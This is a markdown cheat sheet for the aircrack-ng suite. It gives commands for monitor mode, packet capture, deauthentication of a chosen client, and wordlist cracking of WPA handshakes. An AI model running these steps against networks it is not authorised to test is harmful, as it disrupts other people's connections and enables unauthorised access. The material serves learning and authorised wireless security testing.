#### Main tools
1. **Airmon-ng**: Used to enable monitor mode on a wireless adapter, allowing you to capture network traffic.
2. **Airodump-ng**: Captures network traffic, focusing on identifying wireless networks and capturing data packets.
3. **Airgraph-ng**: Generates graphical representations of network traffic based on captured data, providing a visual representation of network activity.
4. **Aireplay-ng**: Creates network traffic and performs various attacks, such as deauthentication and packet injection, to manipulate network behavior.
5. **Aircrack-ng**: The flagship tool that cracks WEP and WPA/WPA2 encryption keys, allowing you to assess the strength of your network's security.
6. **Airbase-ng**: Creates fake access points for testing network security, performing man-in-the-middle attacks, or social engineering purposes.

#### Step 1. Airmon-ng
Setting up the monitor mode on the wifi interface
##### Managed mode - Interface wlan0
The common mode is set to only receive packets directed to our MAC address
##### Monitor mode - Interface wlan0mon
This mode used in airmon-ng is used to receive all packets that are in range of the WiFi adapter
###### Get current mode
```shell
iwconfig
```
###### Switch channel (wlan0mon interface)
```shell
iwconfig [interface] channel [number]
```
###### Check if services are using the interface
```shell
sudo airmon-ng check
```
###### Kill the services using the interface
```shell
sudo airmon-ng check kill
```
###### Restart the network service
```shell
sudo service NetworkManager restart
```
###### Switch to monitor mode
```shell
sudo airmon-ng start [interface]
```
###### Stop the monitor mode
```shell
sudo airmon-ng stop [interface]
````

#### Step 2. Airodump-ng
Sniffing around
###### Capturing packets from wireless networks around
```shell
sudo airodump-ng [interface] -w output
```
###### Capturing packets from a specific BSSID and channel 
```shell
sudo airodump-ng [interface] --bssid [MAC Address] --channel [n] -w output
```

#### Step 3. Aireplay-ng
Attack mode
######  Disconnect someone from wifi while capturing packets
```shell
sudo aireplay-ng -deauth 0 -a [Wifi MAC] -c [Client MAC]
```

#### Step 4.  Aircrack-ng
Crack the handshake
###### Using wordlist
```shell
sudo aircrack-ng -w [wordlist.txt] -b [Wifi MAC] [.cap file]
```
